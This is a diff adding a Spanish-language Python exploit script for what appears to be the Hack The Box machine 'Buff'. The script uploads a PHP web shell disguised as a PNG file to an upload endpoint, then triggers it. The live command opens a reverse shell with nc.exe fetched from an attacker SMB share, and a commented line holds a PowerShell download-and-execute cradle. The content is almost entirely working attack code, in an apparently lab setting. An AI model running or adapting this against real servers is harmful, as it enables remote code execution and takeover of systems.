@@ -96,4 +96,65 @@ if __name__ == '__main__':
         uploadFile(extension)
 ~~~
 
+## Script acceso maquina Buff
 
+~~~ 
+#!/usr/bin/python3
+
+from pwn import *
+import signal, time, pdb, sys, requests
+
+def def_handler(sig, frame):
+	print("\n\n[!] Saliendo...\n")
+	sys.exit(1)
+
+# Ctlr+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+
+url = "http://10.10.10.198:8080/"
+context ="upload.php?id="
+internal_id = "gmsshell2"
+png_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
+upload_url= url + context + internal_id
+#comando = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/PS.ps1')"
+comando = "//10.10.14.16/smbFolder/nc.exe -e cmd 10.10.14.16 4444"
+# comando = "ping 10.10.14.16"
+shell_url = "%supload/%s.php" % (url,internal_id)
+
+def makeRequest():
+
+	print("Iniciando ataque ....")
+	sleep(2)
+
+	data = {'pupload': 'upload'}
+
+	file = {"file":
+		(
+			"%s.php.png" % internal_id,  
+			png_magicBytes+'\n'+r'<?php echo shell_exec("' + comando +'"); ?>'
+			,'image/png', {'Content-Disposition': 'form-data'}
+		)
+	}
+
+	print("Enviando petición ....")
+	# Enviamos la petición
+	s = requests.session()
+	r = s.post(url=upload_url, files=file, data=data, verify=False)
+	sleep(2)
+
+	print("Ejecutando comando ....")
+
+	r = s.get(shell_url, verify=False)
+	sleep(2)
+
+	print("Finalizamos ataque")
+	sleep(1)
+	sys.exit(0)
+
+if __name__ == "__main__":
+
+	makeRequest()
+
+~~~ 
